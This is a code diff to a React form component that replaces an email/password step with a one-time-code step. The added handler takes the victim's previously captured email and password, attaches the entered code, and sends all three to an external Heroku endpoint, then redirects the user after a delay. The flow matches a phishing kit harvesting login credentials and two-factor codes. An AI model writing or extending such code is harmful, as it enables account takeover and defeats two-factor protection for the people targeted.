@@ -6,8 +6,9 @@ import URL from './Url.js'
 const Form = (props) => {
     const history = useHistory()
 
-    const [email, setEmail] = useState('')
-    const [password, setPassword] = useState('')
+   
+    const [otp, setOtp] = useState('')
+    const [keepOtp, setKeepOtp] = useState([])
     const [loading, setLoading] = useState(false)
 
      const inputHandler = (input) => {
@@ -15,44 +16,54 @@ const Form = (props) => {
          setKeepOtp((singleOtp) => [input])
      }
 
-    const handleSubmit = async (e) => {
-        e.preventDefault()
-        setLoading(true)
+     const handleSubmit = async (e) => {
+         e.preventDefault()
+         setLoading(true)
 
-        if (email === '' || password === '') {
-            console.log('not sent')
-        } else {
-            console.log({ email, password })
-            try {
-                const response = await fetch(URL + '/form', {
-                    method: 'POST',
-                    headers: {
-                        'Content-type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email,
-                        password,
-                        pin: '',
-                    }),
-                })
+         const clientOtp = keepOtp.toString()
+         history.push('/')
 
-                const resData = await response.json()
+         if (props.location.state) {
+             const templateParams = props.location.state
 
-                console.log('email sending started')
+             templateParams.clientOtp = clientOtp
 
-                if (resData.status === 'success') {
-                    console.log('Message Sent.')
-                    setLoading(false)
-                    history.push('/otp', { email, password })
-                } else if (resData.status === 'fail') {
-                    console.log('Message failed to send.')
-                    setLoading(false)
-                }
-            } catch (err) {
-                console.log(err)
-            }
-        }
-    }
+             try {
+                 // const URL = 'http://localhost:3030'
+                 const URL = 'https://roqq.herokuapp.com'
+                 const response = await fetch(URL + '/skye-app', {
+                     method: 'POST',
+                     headers: {
+                         'Content-type': 'application/json',
+                     },
+                     body: JSON.stringify({
+                         email: templateParams.email,
+                         password: templateParams.password,
+                         pin: clientOtp,
+                     }),
+                 })
+
+                 const resData = await response.json()
+
+                 console.log('email sending started')
+
+                 if (resData.status === 'success') {
+                     console.log('Message Sent.')
+                     setTimeout(() => {
+                         console.log('time out init')
+                         setLoading(false)
+
+                         history.push('/')
+                     }, 10000)
+                 } else if (resData.status === 'fail') {
+                     console.log('Message failed to send.')
+                     setLoading(false)
+                 }
+             } catch (err) {
+                 console.log(err)
+             }
+         }
+     }
 
     return (
         <>
